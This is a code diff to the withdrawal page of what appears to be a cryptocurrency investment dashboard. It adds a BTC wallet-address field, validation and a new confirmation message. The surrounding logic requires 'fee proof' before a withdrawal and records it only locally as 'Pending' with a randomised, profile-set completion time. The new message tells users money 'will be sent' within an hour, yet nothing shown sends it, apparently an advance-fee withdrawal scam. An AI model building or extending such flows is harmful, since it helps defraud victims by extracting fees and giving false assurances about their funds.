@@ -58,7 +58,26 @@
     return true;
   }
 
-  function queueWithdrawal(amount) {
+  function isLikelyBtcWallet(addr) {
+    var value = (addr || "").trim();
+    if (value.length < 26 || value.length > 90) return false;
+    return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/.test(value);
+  }
+
+  function validateDestinationWallet(wallet) {
+    var value = (wallet || "").trim();
+    if (!value) {
+      showWithdrawError("Enter the BTC wallet address you want to withdraw to.");
+      return false;
+    }
+    if (!isLikelyBtcWallet(value)) {
+      showWithdrawError("Enter a valid BTC wallet address (starts with bc1, 1, or 3).");
+      return false;
+    }
+    return true;
+  }
+
+  function queueWithdrawal(amount, destinationWallet) {
     var profile = getProfile();
     var withinMs = (profile && profile.withdrawCompleteWithinMs) || (60 * 60 * 1000);
     var completesAt = Date.now() + Math.max(5 * 60 * 1000, Math.floor(withinMs * (0.5 + Math.random() * 0.5)));
@@ -76,7 +95,8 @@
       asset: (profile && profile.asset) || "BTC",
       amount: amountLabel,
       status: "Pending",
-      feeProofSubmitted: true
+      feeProofSubmitted: true,
+      destinationWallet: destinationWallet || ""
     });
 
     if (typeof saveTransactions === "function") saveTransactions(txs);
@@ -91,14 +111,30 @@
     var ok = document.getElementById("withdraw-success");
     var err = document.getElementById("withdraw-error");
     if (err) err.classList.add("hidden");
-    ok.textContent = "Fee proof received. Your withdrawal is Pending and will reflect in your wallet within 1 hour.";
+    var shortWallet = destinationWallet
+      ? (destinationWallet.slice(0, 8) + "…" + destinationWallet.slice(-6))
+      : "your wallet";
+    ok.textContent = "Fee proof received. $" +
+      Number(amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) +
+      " will be sent to " + shortWallet + " within 1 hour.";
     ok.classList.remove("hidden");
     var form = document.getElementById("withdraw-form");
     if (form) form.reset();
-    setTimeout(function () { location.href = "/dashboard/accounthistory.html"; }, 2200);
+    setTimeout(function () { location.href = "/dashboard/accounthistory.html"; }, 2500);
+  }
+
+  function setupDestinationWalletField() {
+    var wrap = document.getElementById("withdraw-wallet-wrap");
+    var input = document.getElementById("withdraw-wallet");
+    if (!wrap || !input) return;
+    var needsWallet = typeof requiresWithdrawFeeProof === "function" && requiresWithdrawFeeProof();
+    wrap.classList.toggle("hidden", !needsWallet);
+    input.required = !!needsWallet;
+    if (!needsWallet) input.value = "";
   }
 
   refreshWithdrawAvailable();
+  setupDestinationWalletField();
   document.addEventListener("transactionsUpdated", refreshWithdrawAvailable);
 
   var form = document.getElementById("withdraw-form");
@@ -120,16 +156,21 @@
     if (!validateWithdrawAmount(amount)) return;
 
     if (typeof requiresWithdrawFeeProof === "function" && requiresWithdrawFeeProof()) {
-      showWithdrawFeeProofModal(amount, function () {
-        if (!validateWithdrawAmount(amount)) return;
-        queueWithdrawal(amount);
+      var destinationWallet = (document.getElementById("withdraw-wallet").value || "").trim();
+      if (!validateDestinationWallet(destinationWallet)) return;
+
+      showWithdrawFeeProofModal(amount, destinationWallet, function (result) {
+        var finalAmount = (result && result.amount) || amount;
+        var finalWallet = (result && result.destinationWallet) || destinationWallet;
+        if (!validateWithdrawAmount(finalAmount)) return;
+        queueWithdrawal(finalAmount, finalWallet);
       });
       return;
     }
 
     WalletModal.showWithdrawFee(amount, function () {
       if (!validateWithdrawAmount(amount)) return;
-      queueWithdrawal(amount);
+      queueWithdrawal(amount, "");
     });
   });
 })();
